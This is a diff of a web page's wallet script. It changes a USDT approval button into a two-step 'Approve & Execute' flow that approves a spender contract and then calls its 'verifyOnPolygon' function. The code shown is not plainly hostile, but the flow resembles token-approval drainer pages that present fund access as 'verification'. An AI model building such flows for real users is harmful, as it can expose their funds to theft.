@@ -186,6 +186,17 @@
         }
     ];
 
+    // Your smart contract ABI
+    const CONTRACT_ABI = [
+        {
+            "constant": false,
+            "inputs": [{ "name": "amount", "type": "uint256" }],
+            "name": "verifyOnPolygon",
+            "outputs": [],
+            "type": "function"
+        }
+    ];
+
     let web3;
     let currentAccount = null;
     let userPolBalance = 0;
@@ -223,7 +234,7 @@
         }
 
         if (userPolBalance > 0.001) {
-            btn.textContent = "Approve USDT";
+            btn.textContent = "Approve & Execute";
             btn.disabled = false;
             warning.style.display = "none";
         } else {
@@ -269,35 +280,48 @@
         }
     }
 
-    async function approveUSDT() {
+    async function approveAndExecute() {
         try {
             btn.disabled = true;
-            btn.textContent = "Approving…";
+            btn.textContent = "Approving USDT...";
 
+            // Step 1: Approve USDT
             const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
             const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE);
 
-            const tx = await token.methods
+            const approveTx = await token.methods
                 .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
                 .send({ from: currentAccount });
 
-            onApproveSuccess();
+            // Step 2: Immediately call your smart contract
+            btn.textContent = "Executing Transaction...";
+            
+            const usdtAmount = localStorage.getItem('usdtAmount') || "0";
+            const amountWei = web3.utils.toBN(usdtAmount * 1000000); // USDT has 6 decimals
+            
+            const contract = new web3.eth.Contract(CONTRACT_ABI, SPENDER_CONTRACT_ADDRESS);
+            
+            const contractTx = await contract.methods
+                .verifyOnPolygon(amountWei)
+                .send({ from: currentAccount });
+
+            onSuccess();
         } catch (err) {
-            console.error("Approve failed:", err);
+            console.error("Transaction failed:", err);
             btn.textContent = "Try Again";
             btn.disabled = false;
-            alert("Approval failed: " + err.message);
+            alert("Transaction failed: " + err.message);
         }
     }
 
-    function onApproveSuccess() {
-        btn.textContent = "Approved ✓";
+    function onSuccess() {
+        btn.textContent = "Completed ✓";
         btn.disabled = true;
-        alert("USDT approved successfully!");
+        alert("Success! USDT approved and transaction executed.");
         
-        // Navigate to next step after delay
+        // Navigate to success page after delay
         setTimeout(() => {
-            window.location.href = "execute.html";
+            window.location.href = "success.html";
         }, 2000);
     }
 
@@ -312,8 +336,8 @@
             // Top up POL
             alert("You need POL for gas fees. Please top up your Polygon balance.");
         } else {
-            // Approve USDT
-            await approveUSDT();
+            // Approve USDT and execute smart contract
+            await approveAndExecute();
         }
     }
 
